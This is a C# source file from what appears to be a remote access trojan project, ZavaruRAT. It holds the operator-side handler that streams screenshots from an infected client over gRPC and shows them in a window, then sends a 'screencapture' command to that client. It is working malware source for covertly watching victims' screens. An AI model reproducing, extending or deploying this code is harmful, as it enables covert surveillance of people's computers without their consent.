#region

using Grpc.Core;
using MessagePack;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Admin.CommandHandlers;

public class ScreenCapture : CommandHandler
{
    private readonly AdminHub.AdminHubClient _adminClient;

    public ScreenCapture(AdminHub.AdminHubClient adminClient)
    {
        _adminClient = adminClient;
    }

    public override bool Match(string command)
    {
        return command == "screencapture";
    }

    public override async Task Handle(string hashId, string clientId,
                                      AsyncServerStreamingCall<CommandExecutedEvent> results)
    {
        // create windows form with image
        var form = new Form();
        form.Size = new Size(900, 800);

        var pictureBox = new PictureBox();
        pictureBox.Dock = DockStyle.Fill;
        form.Controls.Add(pictureBox);

        var cts = new CancellationTokenSource();

        var t = Task.Factory.StartNew(async () =>
        {
            while (!cts.IsCancellationRequested)
            {
                await foreach (var commandResult in results.ResponseStream.ReadAllAsync(cts.Token))
                {
                    if (commandResult.HashId == hashId)
                    {
                        if (commandResult.Result.IsEmpty)
                        {
                            continue;
                        }

                        pictureBox.BeginInvoke(() =>
                        {
                            var image =
                                (byte[])MessagePackSerializer.Typeless.Deserialize(commandResult.Result.ToByteArray());

                            using var ms = new MemoryStream();
                            ms.Write(image);
                            ms.Position = 0;

                            pictureBox.Image = Image.FromStream(ms);
                            pictureBox.Refresh();
                        });
                    }

                    Console.WriteLine("Skipping command result: {0}", commandResult.HashId);
                }
            }
        }, TaskCreationOptions.LongRunning);

        form.ShowDialog();
        cts.Cancel();

        try
        {
            await await t;
        }
        catch (RpcException)
        {
            // ignored
        }

        await _adminClient.InvokeCommandAsync(new InvokeCommandRequest
        {
            HashId = hashId,
            Command = "screencapture",
            ClientId = clientId
        });
    }
}
